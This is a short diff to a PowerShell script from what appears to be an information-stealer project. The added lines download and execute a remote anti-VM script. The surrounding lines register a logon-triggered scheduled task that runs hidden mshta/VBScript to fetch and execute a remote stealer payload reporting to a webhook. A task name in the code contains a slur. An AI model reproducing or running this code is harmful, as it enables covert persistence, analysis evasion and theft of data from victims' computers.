@@ -1,5 +1,8 @@
 $webhook = "YOUR_WEBHOOK_HERE"
 
+$skibiditoilet = ("https://raw.githubusercontent.com/s1uiasdad/Stealer_vietnam/main/file/antivm.ps1")
+iex (iwr -uri $skibiditoilet -useb)
+
 $task_name = "account6666niiggggagay"
 New-ScheduledTaskAction -Execute "mshta.exe" -Argument "vbscript:createobject(`"wscript.shell`").run(`"powershell `$webhook='$webhook';iwr('https://raw.githubusercontent.com/s1uiasdad/Stealer_vietnam/main/file/main.ps1')|iex`",0)(window.close)"
 $task_trigger = New-ScheduledTaskTrigger -AtLogOn
